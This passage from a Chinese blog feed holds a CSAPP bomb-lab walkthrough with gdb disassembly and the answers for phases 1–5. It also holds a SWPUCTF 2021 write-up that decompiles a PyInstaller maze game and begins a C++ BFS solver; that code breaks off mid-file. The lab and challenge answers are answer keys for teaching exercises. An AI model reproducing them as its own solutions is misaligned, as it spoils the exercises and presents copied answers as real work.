0xffffceec-0xffffcf58</td><td>计算0xffffceec-0xffffcf58的值</td></tr></tbody></table></div><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203163914571.png" alt="image-20231203163914571"></p><p>在phase_1处下断点<code>b phase_1</code>，然后使用<code>s</code>单步</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203170117688.png" alt="image-20231203170117688"></p><p>发现传入四个参数，其中rdi寄存器存储我们输入的值，rsi寄存器存储着字符串。然后通过函数<code>strings_not_equal</code>可以判断出函数是将这两个字符串进行比较，然后通过<code>test eax, eax</code>对返回值进行判断</p><blockquote><p>如果 <code>eax</code> 的值为零，则零标志位 (ZF) 将被设置为 1。</p><p>如果 <code>eax</code> 的值非零，则零标志位 (ZF) 将被设置为 0.</p></blockquote><p>当<code>ZF</code>标志位为1时，跳转到<code>phase_1+23</code>，否则调用<code>explode——bomb</code></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203171135172.png" alt="image-20231203171135172"></p><p>可以通过<code>x/s</code>查看内存<br/></p><p>显然，<code>phase_1</code>的答案为Border relations with Canada have never been better.</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>删除所有断点，进入<code>phase2</code>，下断点，<code>s</code>单步</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203172459154.png" alt="image-20231203172459154"></p><p>进入<code>read_six_numbers</code>函数</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203184628648.png" alt="image-20231203184628648"></p><p><code>cmp eax, 5</code>应该是每成功处理一个输入，eax++。scanf函数返回已成功赋值的数据项数，返回值存储在eax寄存器。</p><p>eax==5即全部参数处理完毕，由此我们可以确定我们要输入六个参数。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203190610247.png" alt="image-20231203190610247"></p><p>然后继续分析<code>phase_2</code>,直接<code>disassemble phase_2</code></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203194602569.png" alt="image-20231203194602569"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp    DWORD PTR [rsp],0x1</span><br></pre></td></tr></table></figure><p>判断第一个字符是否为1，否则bomb！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add    eax,eax</span><br></pre></td></tr></table></figure><p>每次输入的数就是前面数的两倍</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203201114019.png" alt="image-20231203201114019"></p><p>从bomb.c 文件中可以看到,当输入两个命令行参数时，我们可以以一个文件作为输入，因此可以创建ans.txt文件作为输入</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203201054433.png" alt="image-20231203201054433"></p><p>第一个参数为     /home/randolfluo/Desktop/csapp/bomb/bomb </p><p>第二个参数为     ans.txt</p><p>因此执行 argc为2的代码</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203203308292.png" alt="image-20231203203308292"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203213634902.png" alt="image-20231203213634902"></p><p>调用scanf函数，若已成功赋值的数据项数<code>eax&gt;1</code>成立，则<code>jg</code>有符号大于则跳转,避开爆炸,因此必须要有三个输入<br/></p><p>而我们从scanf函数的format中可以看到，输入了两个整型。但！回车就是第三个输入。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203204253665.png" alt="image-20231203204253665"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x400f6a &lt;phase_3+39&gt;     cmp    dword ptr [rsp + 8], 7</span><br><span class="line">   0x400f6f &lt;phase_3+44&gt;     ja     phase_3+106                      &lt;phase_3+106&gt;</span><br></pre></td></tr></table></figure><p>判断第一个输入小于7，然后进行后续跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x400f75 &lt;phase_3+50&gt;     jmp    qword ptr [rax*8 + 0x402470]  &lt;phase_3+118&gt;</span><br></pre></td></tr></table></figure><p>通过你输入的第一个值来跳转不同验证代码，<code>rax*8 + 0x402470</code>,查看0x402470处的内存，因为linux在x86-64是小端序。小端序意味着较低地址的字节排放在内存中的较低地址，而较高地址的字节排放在内存中的较高地址。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231203215150641.png" alt="image-20231203215150641"></p><p>如果输入 1，则跳转到0x0000000000400fb9</p><p>则第二个数则0x137，化为十进制即311</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>依然是输入两个整型，将phase_4反汇编一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   0x000000000040100c &lt;+0&gt;:sub    rsp,0x18</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:lea    rcx,[rsp+0xc]</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:lea    rdx,[rsp+0x8]</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:mov    esi,0x4025cf</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:cmp    eax,0x2</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:cmp    DWORD PTR [rsp+0x8],0xe</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:mov    edx,0xe</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:mov    esi,0x0</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:mov    edi,DWORD PTR [rsp+0x8]</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:test   eax,eax      ,测试%eax寄存器值是否为0</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:cmp    DWORD PTR [rsp+0xc],0x0，取输入的第二个数</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;，相等则跳转，则第二个数为0</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;，bomb!!!!!</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:add    rsp,0x18</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231212201424254.png" alt="image-20231212201424254"></p><p>调用了<code>fun</code>函数，,同时将第一个输入存放进<code>%rdi</code>寄存器。<br/>发现fun函数是个<code>递归函数</code>。我们需要找到最快方式跳出循环</p><p>jle  0x400ff2 <func4+36>——&gt;0x401007 <func4+57> ——&gt;return</p><p>可以使用<code>word</code>进行分析，其中不同颜色表示不同的跳转地址。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231212204902535.png" alt="image-20231212204902535"></p><p>我们可以得出两个条件<code>输入&lt;=7</code>和输入<code>&gt;=7</code>，那么我们输入的第一个数为<code>7</code>，所以我们的输入为<code>7 0</code></p><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><p>再次使用<code>word</code>大法</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231212223325963.png" alt="image-20231212223325963"></p><p>通过输入的字符串每个元素的<code>低四位</code>来<code>索引</code>字符串<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>的值,最后与<code>flyers</code>进行比较，相同则通关。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20231212215327128.png" alt="image-20231212215327128"></p><p>写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">array=<span class="string">&#x27;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;flyers&#x27;</span></span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    j = array.find(i)</span><br><span class="line">    j = <span class="built_in">bin</span>(j)[<span class="number">2</span>:]<span class="comment">#将0b前缀去掉</span></span><br><span class="line">    j = j.rjust(<span class="number">4</span>,<span class="string">&#x27;0&#x27;</span>)<span class="comment">#向右填充</span></span><br><span class="line">    i  = <span class="string">&#x27;0110&#x27;</span></span><br><span class="line">    j = i+j</span><br><span class="line">    j = <span class="built_in">int</span>(j,<span class="number">2</span>)</span><br><span class="line">    j = <span class="built_in">chr</span>(j)</span><br><span class="line">    <span class="built_in">print</span>(j,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#输出ionefg</span></span><br></pre></td></tr></table></figure><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>下次一定~</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2021 新生赛-老鼠走迷宫</title>
      <link href="/2023/11/24/re/SWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B-%E8%80%81%E9%BC%A0%E8%B5%B0%E8%BF%B7%E5%AE%AB/"/>
      <url>/2023/11/24/re/SWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B-%E8%80%81%E9%BC%A0%E8%B5%B0%E8%BF%B7%E5%AE%AB/</url>
      
        <content type="html"><![CDATA[<p>​    在看雪学苑看到了一题py逆向，正好最近在学习，遂拿来做。<br/></p><p>题目链接<a href="https://pan.baidu.com/s/1Rq4lJmANHSL1EKk8AZxqDw?pwd=0422">https://pan.baidu.com/s/1Rq4lJmANHSL1EKk8AZxqDw?pwd=0422</a> </p><p>首先拿到一个附件，没有后缀</p><p>将其拖入010Editor查看文件头，发现其为4D5A开头，为windowsPE文件的MS-DOS 头，将文件后缀修改为PE文件的可执行系列.exe</p><p><img src="../../img/image-20231121221724145.png" alt="image-20231121221724145"></p><p><img src="../../img/image-20231121221747202.png" alt="image-20231121221747202"></p><p><img src="../../img/image-20231121223453957.png" alt="image-20231121223453957"></p><p><img src="../../img/image-20231121223920738.png" alt="image-20231121223920738"><em>**</em></p><p>可以通过该文件图标特征判断该文件为PyInstaller打包的文件，也可以通过Exeinfo PE来查看文件提示，推荐查看</p><p><a href="https://www.cnblogs.com/Mayfly-nymph/p/13237019.html">python打包的二进制文件反编译 - Hk_Mayfly - 博客园 (cnblogs.com)</a>博客里也有一个pwn题</p><p><img src="../../img/image-20231121224759773.png" alt="image-20231121224759773"></p><p>打开exe程序发现是一道迷宫题，flag是用wasd表示的最短路径的md5值。</p><h4 id="反编译成py文件"><a href="#反编译成py文件" class="headerlink" title="反编译成py文件"></a>反编译成py文件</h4><p>我们先把pyinstxtractor.py复制到exe文件同一目录,执行命令</p><p><img src="../../img/image-20231123224357482.png" alt="image-20231123224357482"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;python pyinstxtractor.py ran.exe</span><br></pre></td></tr></table></figure><p><img src="../../img/image-20231123224911879.png" alt="image-20231123224911879"></p><p>可能的程序入口为5，且生成了一个_extracted文件夹，我们将其中的5和struct复制出来。</p><p><img src="../../img/image-20231123224803830.png" alt="image-20231123224803830"></p><p>将文件5后缀改为5.pyc，分别用winhex打开文件，</p><p>struct</p><p><img src="../../img/image-20231123225620840.png" alt="image-20231123225620840"></p><p>5.pyc</p><p><img src="../../img/image-20231123225656700.png" alt="image-20231123225656700"></p><p>struct比5.pyc多出16字节，将这16字节插入test.pyc的头部<br/></p><p>修改后</p><p><img src="../../img/image-20231123225950143.png" alt="image-20231123225950143"></p><p>在5.pyc目录中打开cmd，用<font color=Red>uncompyle6</font>反编译</p><p><img src="../../img/image-20231123230300476.png" alt="image-20231123230300476"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;uncompyle6 -o  55.py 5.pyc</span><br><span class="line">5.pyc </span><br></pre></td></tr></table></figure><p>打开55.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"># uncompyle6 version 3.7.4</span><br><span class="line"># Python bytecode 3.7 (3394)</span><br><span class="line"># Decompiled from: Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:37:50) [MSC v.1916 64 bit (AMD64)]</span><br><span class="line"># Embedded file name: 5.py</span><br><span class="line"># Compiled at: 1995-09-28 00:18:56</span><br><span class="line"># Size of source mod 2**32: 272 bytes</span><br><span class="line">import random, msvcrt</span><br><span class="line">row, col = (12, 12)</span><br><span class="line">i, j = (0, 0)</span><br><span class="line">maze = [</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1],</span><br><span class="line"> [</span><br><span class="line">  1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1]]</span><br><span class="line">print(&#x27;Mice walk in a maze: wasd to move,q to quit&#x27;)</span><br><span class="line">print(&quot;flag is the shortest path&#x27;s md5,example:if the shortest path is wasdsdw,the flag is md5(&#x27;wasdsdw&#x27;)&quot;)</span><br><span class="line">i, j = (0, 1)</span><br><span class="line">n = 0</span><br><span class="line">while 1:</span><br><span class="line">    if i == row * 2:</span><br><span class="line">        if j == col * 2 - 1:</span><br><span class="line">            print(&#x27;ohhhh!!!!you did it&#x27;)</span><br><span class="line">            break</span><br><span class="line">        print(&#x27;your position:(&#123;&#125;,&#123;&#125;)&#x27;.format(i, j))</span><br><span class="line">        inp = msvcrt.getch()</span><br><span class="line">        n += 1</span><br><span class="line">        ti, tj = i, j</span><br><span class="line">        if b&#x27;a&#x27; == inp and i &gt; 0:</span><br><span class="line">            tj -= 1</span><br><span class="line">        else:</span><br><span class="line">            if b&#x27;w&#x27; == inp and j &gt; 0:</span><br><span class="line">                ti -= 1</span><br><span class="line">            else:</span><br><span class="line">                if b&#x27;s&#x27; == inp and j &lt; row * 2:</span><br><span class="line">                    ti += 1</span><br><span class="line">                else:</span><br><span class="line">                    if b&#x27;d&#x27; == inp and i &lt; col * 2:</span><br><span class="line">                        tj += 1</span><br><span class="line">                    else:</span><br><span class="line">                        if b&#x27;q&#x27; == inp:</span><br><span class="line">                            exit(&#x27;bye!!&#x27;)</span><br><span class="line">                        else:</span><br><span class="line">                            print(&#x27;What???&#x27;)</span><br><span class="line">                            continue</span><br><span class="line">        if maze[ti][tj] == 1:</span><br><span class="line">            print(random.choice([&#x27;no wayy!!&#x27;, &quot;it&#x27;s wall&quot;, &#x27;nop&#x27;]))</span><br><span class="line">            continue</span><br><span class="line">    elif maze[ti][tj] == 0:</span><br><span class="line">        print(random.choice([&#x27;nice!!&#x27;, &#x27;yeah!!&#x27;, &#x27;Go on&#x27;]))</span><br><span class="line">        i, j = ti, tj</span><br></pre></td></tr></table></figure><p>从<a href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458528628&amp;idx=1&amp;sn=ef9ac6ebbb41e22a4fa4b62bf1a9bd49&amp;chksm=b18d1bfe86fa92e8d3ee8a6e5ea85ee6cc59e3feffb769ac66fb3a5e5dcb252c99bc87239a3a&amp;scene=126&amp;sessionid=1700800667#rd">关于迷宫题的一些求解思路 (qq.com)</a>得到bfs算法得出路径</p><p>exp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BFS——广度优先算法（Breadth First Search）</span></span><br><span class="line"><span class="comment">//简单来说，BFS算法会判断当前状态可以行走的方向。假设你是一只老鼠，如果只有一条路，你会沿着这条路一直走。当到交叉路口时，BFS算法会clone出多个小鼠同时向多个方向进攻。同时利用队列保存每一个小鼠对象。当检测到小鼠未到达出口时，逐个出列，小鼠继续前进。当有一只小鼠找到出口时，退出循环。此时小鼠走过的路径就是最短路径（但不唯一，因为队列里的小鼠走过的路径长度是相同的，可能队列中下一个小鼠也能到达出口） </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> maze[<span class="number">25</span>][<span class="number">26</span>] = &#123;<span class="comment">//注意String类型有&#x27;/0&#x27; </span></span><br><span class="line"><span class="string">&quot;1S11111111111111111111111&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010000000000000000000101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010111111111111101110101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010000010001000001000101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1011111010101011111011101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1000100010101010100010001&quot;</span>,</span><br><span class="line"><span class="string">&quot;1110111110101010101111101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010001000100010100000101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1011101011111110111110101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1000001000001000001010001&quot;</span>,</span><br><span class="line"><span class="string">&quot;1011111110101011101011101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010000010101000100010001&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010111011101010111010111&quot;</span>,</span><br><span class="line"><span class="string">&quot;1000101010001010001010101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1111101010111011101010101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010001010001010001010101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010101010101110111110101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010100010101000100010001&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010111110101011101011101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010001000101000101000101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1011101111101110101110101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010001000101000101010101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1010111010101011101010101&quot;</span>,</span><br><span class="line"><span class="string">&quot;1000000010001000000010001&quot;</span>,</span><br><span class="line"><span class="string">&quot;11111111111111111111111E1&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//25*25</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="type">int</span> row, col;</span><br><span class="line">    string path;  <span class="comment">// 路径跟踪变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 